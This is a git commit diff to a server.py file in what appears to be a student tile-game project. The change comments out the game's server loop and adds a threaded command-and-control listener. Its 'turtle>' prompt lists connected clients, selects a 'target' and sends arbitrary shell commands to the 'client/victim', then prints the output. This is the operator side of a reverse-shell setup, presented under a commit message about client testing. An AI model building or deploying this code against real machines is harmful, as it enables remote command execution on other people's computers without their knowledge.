6732611ed06e9fcc8e32bd5e585a41d29060734a
Shane <shanemonck11@hotmail.com>
2021-04-25 14:37:04 +0800

    woking differnt cliets with client test

--- project1files/server.py
+++ project1files/server.py
@@ -19,6 +19,19 @@ import socket
 import sys
 import tiles
 
+import threading
+import time
+from queue import Queue
+
+#Two things being done simultaneously
+NUMBER_OF_THREADS = 2
+#Job no1 = listen for connection and accept
+#job no2 = send commands and handle connections with clients
+JOB_NUMBER =[1,2]
+queue = Queue()
+all_connections = []
+all_addresses = []
+
 
 def client_handler(connection, address):
   host, port = address
@@ -101,19 +114,186 @@ def client_handler(connection, address):
             connection.send(tiles.MessagePlayerTurn(idnum).pack())
 
 
+
+
+
 # create a TCP/IP socket
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+#sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 # listen on all network interfaces
-server_address = ('', 30020)
-sock.bind(server_address)
+#server_address = ('', 30020)
+#sock.bind(server_address)
 
-print('listening on {}'.format(sock.getsockname()))
+#print('listening on {}'.format(sock.getsockname()))
 
-sock.listen(5)
+#sock.listen(5)
 
-while True:
+
+
+# Create a Socket ( connect two computers)
+def create_socket():
+    try:
+        global host
+        global port
+        global s
+        host = ""
+        port = 9999
+        s = socket.socket()
+
+    except socket.error as msg:
+        print("Socket creation error: " + str(msg))
+
+
+# Binding the socket and listening for connections
+def bind_socket():
+    try:
+        global host
+        global port
+        global s
+        print("Binding the Port: " + str(port))
+
+        s.bind((host, port))
+        s.listen(5)
+        print('listening on {}'.format(s.getsockname()))
+    except socket.error as msg:
+        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
+        bind_socket()
+
+
+# Handling connection from multiple clients and saving to a list
+# Closing previous connections when server.py file is restarted
+
+def accepting_connections():
+    for c in all_connections:
+        c.close()
+
+    del all_connections[:]
+    del all_addresses[:]
+
+    while True:
+        try:
+            conn, address = s.accept()
+            s.setblocking(1)  # prevents timeout
+
+            all_connections.append(conn)
+            all_addresses.append(address)
+
+            print("Connection has been established :" + address[0])
+
+        except:
+            print("Error accepting connections")
+
+
+# 2nd thread functions - 1) See all the clients 2) Select a client 3) Send commands to the connected client
+# Interactive prompt for sending commands
+# turtle> list
+# 0 Friend-A Port
+# 1 Friend-B Port
+# 2 Friend-C Port
+# turtle> select 1
+# 192.168.0.112> dir
+
+
+def start_turtle():
+
+    while True:
+        cmd = input('turtle> ')
+        if cmd == 'list':
+            list_connections()
+        elif 'select' in cmd:
+            conn = get_target(cmd)
+            if conn is not None:
+                send_target_commands(conn)
+
+        else:
+            print("Command not recognized")
+
+
+# Display all current active connections with client
+
+def list_connections():
+    results = ''
+
+    for i, conn in enumerate(all_connections):
+        try:
+            conn.send(str.encode(' '))
+            conn.recv(20480)
+        except:
+            del all_connections[i]
+            del all_addresses[i]
+            continue
+
+        results = str(i) + "   " + str(all_addresses[i][0]) + "   " + str(all_addresses[i][1]) + "\n"
+
+    print("----Clients----" + "\n" + results)
+
+
+# Selecting the target
+def get_target(cmd):
+    try:
+        target = cmd.replace('select ', '')  # target = id
+        target = int(target)
+        conn = all_connections[target]
+        print("You are now connected to :" + str(all_addresses[target][0]))
+        print(str(all_addresses[target][0]) + ">", end="")
+        return conn
+        # 192.168.0.4> dir
+
+    except:
+        print("Selection not valid")
+        return None
+
+
+# Send commands to client/victim or a friend
+def send_target_commands(conn):
+    while True:
+        try:
+            cmd = input()
+            if cmd == 'quit':
+                break
+            if len(str.encode(cmd)) > 0:
+                conn.send(str.encode(cmd))
+                client_response = str(conn.recv(20480), "utf-8")
+                print(client_response, end="")
+        except:
+            print("Error sending commands")
+            break
+
+
+# Create worker threads
+def create_workers():
+    for _ in range(NUMBER_OF_THREADS):
+        t = threading.Thread(target=work)
+        t.daemon = True
+        t.start()
+
+
+# Do next job that is in the queue (handle connections, send commands)
+def work():
+    while True:
+        x = queue.get()
+        if x == 1:
+            create_socket()
+            bind_socket()
+            accepting_connections()
+        if x == 2:
+            start_turtle()
+
+        queue.task_done()
+
+
+def create_jobs():
+    for x in JOB_NUMBER:
+        queue.put(x)
+
+    queue.join()
+
+
+create_workers()
+create_jobs()
+
+#while True:
   # handle each new connection independently
-  connection, client_address = sock.accept()
-  print('received connection from {}'.format(client_address))
-  client_handler(connection, client_address)
+ # connection, client_address = sock.accept()
+  ##print('received connection from {}'.format(client_address))
+  #client_handler(connection, client_address)
